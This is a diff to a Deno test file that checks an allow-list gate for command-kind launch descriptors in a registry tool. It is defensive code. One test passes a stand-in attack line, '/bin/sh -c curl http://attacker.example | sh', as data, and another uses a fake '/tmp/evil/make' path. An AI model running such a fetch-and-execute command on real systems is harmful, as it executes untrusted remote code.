@@ -10,6 +10,7 @@
 
 import { assertEquals } from "./_assert.ts";
 import {
+  LAUNCH_COMMANDS_ENV,
   LAUNCH_HOSTS_ENV,
   launchDenial,
 } from "../src/registry/launch_policy.ts";
@@ -26,6 +27,11 @@ function env(
 /** A module-kind location for `module`. */
 function moduleAt(module: string): BuildLocation {
   return { kind: "module", module, cwd: "/work" };
+}
+
+/** A command-kind location for `command`. */
+function commandOf(...command: string[]): BuildLocation {
+  return { kind: "command", command, cwd: "/work" };
 }
 
 Deno.test("a local entry module is always allowed", () => {
@@ -153,14 +159,96 @@ Deno.test("an allow-listed plaintext origin still needs the insecure opt-out", (
   );
 });
 
-Deno.test("a command location is not scheme-checked", () => {
-  // Its argv names programs already on the machine; there is no fetch to gate,
-  // and `--allow-run`/`--protect` are what bound it.
+Deno.test("a command location is refused unless its program is allow-listed", () => {
+  // The registry writer chooses the program *and* its arguments, so a command
+  // descriptor is code execution on a registry's say-so — the same threat the
+  // module gate refuses, spelled without a fetch.
+  const denial = launchDenial(commandOf("./zuke", "--"), env());
+  assertEquals(denial?.reason, "launch_command_not_allowed");
+  assertEquals(denial?.detail.includes(LAUNCH_COMMANDS_ENV), true);
+  assertEquals(denial?.detail.includes("./zuke"), true);
+
   assertEquals(
     launchDenial(
-      { kind: "command", command: ["./zuke", "--"], cwd: "/work" },
-      env(),
+      commandOf("./zuke", "--"),
+      env({ [LAUNCH_COMMANDS_ENV]: "./zuke" }),
     ),
     null,
+  );
+});
+
+Deno.test("the command allow-list matches the program or its last segment", () => {
+  // A bare entry admits the program wherever it lives, so an operator does not
+  // have to know the descriptor's spelling...
+  assertEquals(
+    launchDenial(
+      commandOf("/usr/bin/make", "release"),
+      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
+    ),
+    null,
+  );
+  assertEquals(
+    launchDenial(
+      commandOf("C:\\Program Files\\make.EXE"),
+      env({ [LAUNCH_COMMANDS_ENV]: "MAKE.exe" }),
+    ),
+    null,
+  );
+  // ...while an absolute entry admits only itself, which is how an operator
+  // binds the program to one path.
+  assertEquals(
+    launchDenial(
+      commandOf("/tmp/evil/make", "release"),
+      env({ [LAUNCH_COMMANDS_ENV]: "/usr/bin/make" }),
+    )?.reason,
+    "launch_command_not_allowed",
+  );
+});
+
+Deno.test("the command allow-list shares its spelling with the host list", () => {
+  // Comma- or space-separated, trimmed, and `*` for an operator who has decided
+  // the registry itself is trusted.
+  for (
+    const raw of ["make, deploy.sh", "make deploy.sh", " make ,,deploy.sh "]
+  ) {
+    assertEquals(
+      launchDenial(commandOf("deploy.sh"), env({ [LAUNCH_COMMANDS_ENV]: raw })),
+      null,
+    );
+  }
+  assertEquals(
+    launchDenial(
+      commandOf("/bin/sh", "-c", "curl http://attacker.example | sh"),
+      env({ [LAUNCH_COMMANDS_ENV]: "*" }),
+    ),
+    null,
+  );
+  // An unrelated entry does not admit it.
+  assertEquals(
+    launchDenial(
+      commandOf("/bin/sh", "-c", "id"),
+      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
+    )
+      ?.reason,
+    "launch_command_not_allowed",
+  );
+});
+
+Deno.test("an empty command is left for the caller to report", () => {
+  // The server answers "no runnable launch command", which says more than a
+  // policy denial would; the gate must not turn that into a refusal.
+  assertEquals(launchDenial(commandOf(), env()), null);
+  assertEquals(launchDenial(commandOf(""), env()), null);
+});
+
+Deno.test("the host allow-list does not admit a command program", () => {
+  // The two lists are separate decisions: trusting an origin to serve a module
+  // is not trusting a registry to name a program and its arguments.
+  assertEquals(
+    launchDenial(
+      commandOf("make"),
+      env({ [LAUNCH_HOSTS_ENV]: "*" }),
+    )?.reason,
+    "launch_command_not_allowed",
   );
 });
